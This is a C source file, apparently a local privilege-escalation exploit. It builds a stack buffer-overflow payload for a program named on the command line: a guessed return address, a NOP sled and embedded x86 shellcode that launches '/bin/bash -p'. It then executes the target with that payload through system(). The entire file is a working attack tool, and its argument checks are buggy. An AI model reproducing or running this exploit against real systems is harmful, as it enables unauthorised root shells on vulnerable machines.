
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BUFFER 200


char shellcode[] = 
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70"
"\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61"
"\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52"
"\x51\x53\x89\xe1\xcd\x80";

void fail(char *msg)
{
    char message_error[100];

    strcpy(message_error, "[ERROR]\t!!!Failed erro ");
    strncat(message_error, msg, 40);
    perror(message_error);

    exit(1);
}

void usage(char *prg)
{   
    printf("[INFO]\tusage =>\n\t$%s <app to exploit> <offset default:270>", prg);
    exit(1);
}

int main(int argc, char **argv)
{
    unsigned int position_now;
    int offset;
    char *commande;
    unsigned long long return_adresse;
    int lenght;

    lenght = strlen(argv[1]) + strlen("\'");

    if(argc < 1)
        usage(argv[0]);

    commande = malloc(sizeof(char) * (lenght + BUFFER) );
    if(commande == NULL)
        fail("malloc error");
    
    bzero(commande, lenght + BUFFER);

    if(argc >= 2)
        offset = atoi(argv[2]);
    else
        offset = 270;

    strcpy(commande, argv[1]);
    strcat(commande, "\'");

    return_adresse = (unsigned long long )(&position_now - offset);

    int i;
    char *buffer;

    i = 0;
    buffer = commande + lenght;

    while(i < BUFFER)
    {
        *((unsigned long long *)(buffer + i)) = return_adresse;
        i += 8;
    }

    memset(buffer, 0x90, 60);      //60 octet 
    memcpy(buffer+60, shellcode, sizeof(shellcode) -1 );

    strcat(commande, "\'");

    system(commande);

    free(commande);
    
    return 0;
}